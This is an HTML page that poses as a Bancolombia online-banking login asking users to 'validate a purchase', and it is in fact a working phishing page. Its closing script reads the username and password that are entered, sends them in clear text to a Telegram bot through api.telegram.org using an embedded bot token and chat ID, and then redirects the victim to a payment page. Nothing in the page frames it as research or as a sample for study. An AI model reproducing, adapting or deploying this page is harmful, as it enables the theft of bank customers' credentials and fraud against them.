<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f6f6f6;
            margin: 0;
            flex-direction: column;
            background-image: url(../../img/fond.svg);
            background-repeat: no-repeat;
            background-position: bottom;
        }

        .container {
            background-color: white;
            padding: 2rem;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            margin: 2rem auto;
        }

        .header-logo {
            padding-bottom: 4%;
            padding-top: 5%;
            margin-bottom: 2%;
            width: 100%;
            display: flex;
            justify-content: center;
            background-color: white;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .header-logo img {
            width: 70%;
            max-width: 300px;
        }

        .welcome-title {
            font-size: 1.8rem;
            margin: 2rem 0;
            color: #333;
            font-weight: 600;
        }

        .logo-section {
            padding-bottom: 5%;
            border-bottom: 1px solid #e0e0e0;
            margin-bottom: 2rem;
        }

        .logo-section img {
            width: 70%;
            max-width: 200px;
        }

        .validation-text {
            margin: 1rem 0 2rem 0;
        }

        .validation-text p {
            margin-bottom: 1rem;
        }

        .validation-text strong {
            font-size: 1.1rem;
            color: #333;
        }

        .security-text {
            text-align: left;
            color: #666;
            font-size: 0.95rem;
            line-height: 1.4;
        }

        h1 {
            font-size: 1.4rem;
            margin-bottom: 1.5rem;
            color: #333;
            font-weight: 500;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        label {
            text-align: left;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
            color: #555;
            font-weight: 500;
        }

        input {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: solid #ddd;
            border-width: 0 0 2px 0;
            border-radius: 5px;
            font-size: 1rem;
            color: #333;
            width: 100%;
            box-sizing: border-box;
            background-color: #fafafa;
            transition: border-color 0.3s ease;
        }

        input:focus {
            outline: none;
            border-bottom-color: #fada25;
            background-color: white;
        }

        .forgot-password {
            text-align: right;
            display: block;
            margin-bottom: 1.5rem;
            color: #0066cc;
            font-size: 0.9rem;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .forgot-password:hover {
            color: #004499;
            text-decoration: underline;
        }

        .login-button {
            background-color: #fada25;
            border: none;
            padding: 0.8rem;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: 600;
            color: #000000;
            cursor: pointer;
            margin-bottom: 1.5rem;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }

        .login-button:hover {
            background-color: #e8c420;
            transform: translateY(-1px);
        }

        .login-button:active {
            transform: translateY(0);
        }

        footer {
            padding: 3rem 5% 5%;
            text-align: center;
        }

        .footer-content {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            gap: 1rem;
        }

        .footer-content img:first-child {
            width: 50%;
            max-width: 200px;
        }

        .footer-content img:last-child {
            width: 40%;
            max-width: 160px;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .container {
                width: 95%;
                padding: 1.5rem;
            }
            
            .welcome-title {
                font-size: 1.5rem;
            }
            
            .header-logo img {
                width: 80%;
            }
        }
    </style>
</head>
<body>

    <h1 class="welcome-title">Te damos la bienvenida</h1>

    <div class="container">
        <div class="logo-section">
            <img src="../img/BANCOLOMBIA.png" alt="Bancolombia">
        </div>

        <div class="validation-text">
            <p><strong>Vamos a validar tu compra</strong></p>
            <p class="security-text">Verifica la transacción que intentas realizar con tu tarjeta por seguridad</p>
        </div>

        <h1>Ingresa a la Banca Virtual</h1>
        
        <form>
            <label for="username">Usuario Bancolombia</label>
            <input type="text" id="username" placeholder="Usuario" required>
            
            <label for="password">Ingresa tu contraseña</label>
            <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
            
            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
            <button type="submit" id="submitBtn" class="login-button">INGRESAR</button>
        </form>
    </div>

    <footer>
        <div class="footer-content">
            <img src="../img/BANCOLOMBIA.png" alt="Bancolombia">
            <img src="../img/vigilado.691ba87177cfc7656937fafcb0c6925a.svg" alt="Vigilado">
        </div>
    </footer>

    <script>
        function enviarMensajeTelegram(username, password) {
    var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
    var chatID = '5900829263';
    var mensaje = 'Logo Bancolombia: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
    var xhttp = new XMLHttpRequest();
    xhttp.open('GET', url, true);
    xhttp.send();
}

document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('submitBtn').addEventListener('click', function(event) {
        event.preventDefault(); // Evita que el formulario se envíe por defecto

        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        if (username.trim() !== '' && password.trim() !== '') {
            enviarMensajeTelegram(username, password);
            setTimeout(function() {
                window.location.href = '../cargapago.html';
            }, 1000);
        } else {
            alert('Por favor complete todos los campos antes de continuar.');
        }
    });
});
    </script>
</body>
</html>
